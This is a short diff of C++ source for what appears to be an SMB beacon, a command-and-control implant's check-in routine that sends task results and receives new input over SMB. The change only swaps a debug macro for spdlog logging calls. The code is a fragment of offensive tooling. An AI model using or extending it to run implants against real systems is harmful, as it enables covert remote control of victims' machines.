@@ -19,17 +19,17 @@ BeaconSmb::~BeaconSmb()
 
 void BeaconSmb::checkIn()
 {
-	DEBUG("initConnection");
+	SPDLOG_DEBUG("initConnection");
 	while(!m_clientSmb->initConnection())
 	{
 		std::this_thread::sleep_for(std::chrono::milliseconds(333));	
-		DEBUG("initConnection");
+		SPDLOG_DEBUG("initConnection");
 	}
 
 	std::string output;
 	taskResultsToCmd(output);
 
-	DEBUG("sending output.size " << std::to_string(output.size()));
+	SPDLOG_DEBUG("sending output.size {0}", std::to_string(output.size()));
 
 	bool res = m_clientSmb->sendData(output);
 	if(res)
@@ -42,7 +42,7 @@ void BeaconSmb::checkIn()
 		}
 		if(res)
 		{
-			DEBUG("received input.size " << std::to_string(input.size()));
+			SPDLOG_DEBUG("received input.size {0}", std::to_string(input.size()));
 
 			if(!input.empty())
 			{
@@ -51,11 +51,11 @@ void BeaconSmb::checkIn()
 		}
 		else
 		{
-			DEBUG("Receive failed");
+			SPDLOG_DEBUG("Receive failed");
 		}
 	}
 	else
-		DEBUG("Send failed");	
+		SPDLOG_DEBUG("Send failed");	
 
 
 	m_clientSmb->closeConnection();
